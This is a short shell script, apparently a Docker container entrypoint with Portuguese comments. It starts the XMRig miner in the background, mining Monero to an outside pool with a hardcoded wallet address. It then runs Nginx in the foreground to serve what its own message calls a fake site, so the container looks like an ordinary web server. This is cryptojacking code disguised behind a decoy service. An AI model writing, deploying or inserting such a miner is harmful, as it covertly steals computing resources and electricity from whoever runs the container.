#!/bin/sh

echo "[*] Iniciando Minerador Controlado (50% CPU)..."
# Inicia o XMRig em background com limite de 2 threads
xmrig --url gulf.moneroocean.stream:10001       --user 46oHB6ZkVB6UoigmzcvRjnR4M7HZTh49c8azDo2J97fFcNHvA3JqFvtTFLtmf53FNyEVxhWchekUxE8pq1gokjm9Bg2gUGS       --pass x       --rig-id Docker-50percent       --threads 2       --background || true

echo "[*] Minerador iniciado. Subindo site falso..."
# O Nginx roda em primeiro plano para manter o container vivo
nginx -g "daemon off;"
